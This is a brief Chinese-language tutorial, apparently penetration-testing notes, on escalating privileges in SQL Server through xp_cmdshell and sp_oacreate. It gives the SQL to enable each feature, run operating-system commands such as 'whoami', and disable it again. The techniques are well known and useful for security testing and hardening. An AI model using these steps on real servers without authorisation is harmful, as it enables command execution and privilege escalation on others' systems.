# SQL Server 提权

## xp_cmdshell 提权

1. 利用条件
    - 有 DBA 权限, 05版本可获得 system 权限, 08是network权限
    - 依赖 xplog70.dll
2. 利用流程
    - 判断 xp_cmdshell 是否开启
        ```sql
        exec master..xp_cmdshell 'ver'
        ```
    - 开启 xp_cmdshell
        ```sql
        exec sp_configure 'show advanced options', 1; reconfigure;
        exec sp_configure 'xp_cmdshell', 1; reconfigure;
        ```
    - 命令执行
        ```sql
        exec master..xp_cmdshell 'whoami'
        ```
    - 关闭 xp_cmdshell
        ```sql
        exec sp_configure 'show advanced options', 1; reconfigure;
        exec sp_configure 'xp_cmdshell', 0; reconfigure;
        ```

## sp_oacreate 提权

1. 工作原理
    - 开启外围应用配置器中的 `OleAutomationEnabled`, 并调用 sp_oacreate 执行系统命令
2. 利用条件
    - DBA 权限
    - 依赖 odsole70.dll
3. 提权流程
    - 判断 sp_oacreate 是否开启
        ```sql
        declare @shell int exec sp_oacreate 'wscript.shell'
        ```
    - 开启 sp_oacreate
        ```sql
        exec sp_configure 'show advanced options', 1; reconfigure;
        exec sp_configure 'Ole Automation Procedures', 1; reconfigure;
        ```
    - 执行系统命令
        ```sql
        declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod
        @shell, 'run', null, 'c:/windows/system32/cmd.exe whoami> c:/Temp/cmd.txt'
        ``` 
    - 关闭 sp_oacreate
        ```sql
        exec sp_configure 'show advanced options', 1; reconfigure;
        exec sp_configure 'Ole Automation Procedures', 0; reconfigure;
        ```